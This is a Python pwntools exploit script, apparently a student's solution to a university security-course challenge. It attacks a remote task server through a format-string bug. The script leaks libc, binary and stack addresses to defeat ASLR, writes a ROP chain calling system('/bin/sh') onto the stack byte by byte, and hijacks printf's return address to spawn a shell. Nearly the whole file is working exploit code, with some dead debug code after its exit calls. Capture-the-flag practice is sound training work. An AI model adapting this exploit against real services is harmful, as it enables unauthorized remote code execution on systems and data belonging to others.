#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'
#pwn.context.binary = exe


conn = pwn.remote('tasks.ws24.softsec.rub.de', 33420)
#conn = pwn.process([exe.path])

#pwn.gdb.attach(conn)

#pwn.gdb.attach(conn, gdbscript="""
#set follow-fork-mode child      
#""")



def set_format_string(fmt):
    # invert byte string, as we have to write last byte first
    fmt = fmt[::-1]
    for pos, byte in enumerate(fmt):
        conn.recvuntil(b'Option? 1:set 2:print\n> ')
        conn.send(b'1\n')
        conn.recvuntil(b'What is the length of the new format?\n> ')
        length = len(fmt)-pos
        conn.send(f'{length}\n'.encode('ascii'))
        conn.recvuntil(b'What is the new format?\n> ')
        payload = b'A'*(len(fmt)-pos-1) + byte.to_bytes(1, byteorder='little')
        conn.send(payload)


def print_register_and_memory(max, result):
    # set format string
    fmt = b''
    for pos in range(1,max+1):
        fmt += b'%' + str(pos).encode('ascii') + b'$llx\n'

    print(f'format string: {fmt.hex()}')

    set_format_string(fmt)

    # get data
    conn.recvuntil(b'Option? 1:set 2:print\n> ')
    conn.send(b'2\n')
    conn.recvuntil(b'Output:\n')

    rdi = conn.recvline()
    rsi = conn.recvline()
    rdx = conn.recvline()
    rcx = conn.recvline()
    r8 = conn.recvline()
    r9 = conn.recvline()

    print(f'rdi = 0x{str(rdi)[(2):-3]}')
    print(f'rsi = 0x{str(rsi)[(2):-3]}')
    print(f'rdx = 0x{str(rdx)[(2):-3]}')
    print(f'rcx = 0x{str(rcx)[(2):-3]}')
    print(f' r8 = 0x{str(r8)[(2):-3]}')
    print(f' r9 = 0x{str(r9)[(2):-3]}')

    for i in range(7,max+1):
        stack = conn.recvline()

        result.append((int(str(stack)[(2):-3], 16), i))

        print(f'ret + {(i-6)*8} (input {i}) = 0x{str(stack)[(2):-3]}')
    
    conn.recvuntil(b'\n')


# just for testing, see what we got
result = []
#print_register_and_memory(50, result)
"""
addresses = sorted({(e,p) for e,p in result})
print("\n\nresult")
for address, pos in addresses:
    print(f'{hex(address)} at input {pos}')
"""


# Get ASLR of libc: in rdx (3rd argument is pointer to write+16)
set_format_string(b'%3$llx\n\x00')
conn.recvuntil(b'Option? 1:set 2:print\n> ')
conn.send(b'2\n')
conn.recvuntil(b'Output:\n')
rdx = conn.recvline()
conn.recvuntil(b'\n')

libc_base_address = pwn.u64(pwn.unhex(rdx[:-1]).rjust(8, b'\x00'), endianness='big') - (libc.symbols['write'] + 16)

# Get ASLR of vuln: in 15th input
set_format_string(b'%15$llx\n\x00')
conn.recvuntil(b'Option? 1:set 2:print\n> ')
conn.send(b'2\n')
conn.recvuntil(b'Output:\n')
stack = conn.recvline()
conn.recvuntil(b'\n')

vuln_base_address = pwn.u64(pwn.unhex(stack[:-1]).rjust(8, b'\x00'), endianness='big') - (exe.symbols['main'])


# get address of stack
set_format_string(b'%21$llx\n\x00')
conn.recvuntil(b'Option? 1:set 2:print\n> ')
conn.send(b'2\n')
conn.recvuntil(b'Output:\n')
address = conn.recvline()
conn.recvuntil(b'\n')

stack_address_input_21 = pwn.u64(pwn.unhex(address[:-1]).rjust(8, b'\x00'), endianness='big') - 0xE0
print(f'input 21 is at offset: {hex(stack_address_input_21)}')

stack_address_canarie_input_7 = stack_address_input_21 - 8*14
print(f'input 7/canarie is at offset: {hex(stack_address_canarie_input_7)}')

stack_address_input_11_rop_chain_start = stack_address_canarie_input_7 + 8*4
print(f'input 11/gadget2 is at offset: {hex(stack_address_input_11_rop_chain_start)}')


# now write 32 byte ropchain starting at stack_address_input_11_rop_chain onto stack
libc.address = libc_base_address
rop = pwn.ROP(libc)
rop.call(rop.ret)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])

ropchain = rop.chain()
print(ropchain)

for pos, byte in enumerate(ropchain):
    # we write address of the stackaddress where we want to write data into stack_address_input_21
    # thats writes input input 21+28=49

    # 0x7ffd682f|aea8 (input 21 has address of vuln)
    # just write 2 bytes at input 21, then at input21 is a pointer to stack memory where we want to write one byte, then add +1 and so on to write bytes
    
    # write address we want to write to onto stack at input 21
    last_two_bytes = stack_address_input_11_rop_chain_start % 2**16
    print(f'doing offset: {hex(last_two_bytes+pos)} for byte {byte}')
    #print(f'we print {last_two_bytes} bytes')
    fmt = (b'%' + str(last_two_bytes+pos).encode('ascii') + b'd') + b'%21$hn' + b'\x00'
    
    # set 
    set_format_string(fmt)
    conn.recvuntil(b'Option? 1:set 2:print\n> ')
    conn.send(b'2\n')
    conn.recvuntil(b'Output:\n')
    conn.recvline()
    
    # write single byte at the address
    fmt = b''
    if byte > 0:
        fmt += (b'%' + str(byte).encode('ascii') + b'd')
    fmt +=b'%49$hhn' + b'\x00'
    set_format_string(fmt)
    conn.recvuntil(b'Option? 1:set 2:print\n> ')
    conn.send(b'2\n')
    conn.recvuntil(b'Output:\n')
    conn.recvline()
    

# finally override last 2 bytes of return address of printf to trigger ropchain (gadget from vuln)
trigger_gadget = 0x0000000000001469 #add rsp, 0x18; pop rbx; pop rbp; ret; 

print(f'address of gadget: {hex(vuln_base_address+trigger_gadget)}')
trigger_gadget_last_two_bytes = (vuln_base_address + trigger_gadget) % 2**16
# main is at offset 0x4352
#trigger_gadget = 0x0000000000004469 #add rsp, 0x18; pop rbx; pop rbp; ret; 
#trigger_gadget = 0x0000000000003469 #add rsp, 0x18; pop rbx; pop rbp; ret; 

# write address we want to write to onto stack at input 21
last_two_bytes = (stack_address_input_11_rop_chain_start-6*8) % 2**16
print(f'overriting at stack address: {hex(last_two_bytes)}')
fmt = (b'%' + str(last_two_bytes).encode('ascii') + b'd') + b'%21$hn' + b'\x00'

# set 
set_format_string(fmt)
conn.recvuntil(b'Option? 1:set 2:print\n> ')
conn.send(b'2\n')
conn.recvuntil(b'Output:\n')
conn.recvline()

# write last 2 bytes of gadget
fmt = (b'%' + str(trigger_gadget_last_two_bytes).encode('ascii') + b'd') + b'%49$hn' + b'\x00'
set_format_string(fmt)
conn.recvuntil(b'Option? 1:set 2:print\n> ')
conn.send(b'2\n')
conn.recvuntil(b'Output:\n')


conn.interactive()
exit()



# invalid: 0x599434141469
# correct: 0x599434143469























rop = pwn.ROP(libc)
rop.call(rop.ret)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])

# rop chain has 32 bytes 
print(rop.chain())
print(len(rop.chain()))

# canarie is at input 7 (easy to recognize as 0x00 at the end/start)

# Step 1: write a ropchain somewhere onto the stack (byte for byte)



conn.interactive()







exit()


set_format_string(b'%22$llx\n\x00')
conn.recvuntil(b'Option? 1:set 2:print\n> ')
conn.send(b'2\n')
conn.recvuntil(b'Output:\n')
fini_array_address = conn.recvline()
print(fini_array_address)

set_format_string(b'%15$llx\n\x00')
conn.recvuntil(b'Option? 1:set 2:print\n> ')
conn.send(b'2\n')
conn.recvuntil(b'Output:\n')
address_main = conn.recvline()
address_main = pwn.u64(pwn.unhex(address_main[:-1]).rjust(8, b'\x00'), endianness='big')
print(hex(address_main))

# extract last two bytes
address_main_last_2_bytes = address_main % 2**16
print(f'number of chars: {address_main_last_2_bytes}')

# override return in exit()
fmt = (b'%' + str(42).encode('ascii') + b'd') + b'%22$hhn' + b'\x00'
set_format_string(fmt)
conn.recvuntil(b'Option? 1:set 2:print\n> ')
conn.send(b'2\n')




# Step 2: override return address of printf (or other) to jump to my ropchain (first thing ropchain does is adding to rsp to move ropchain to top of stack :)


conn.interactive()


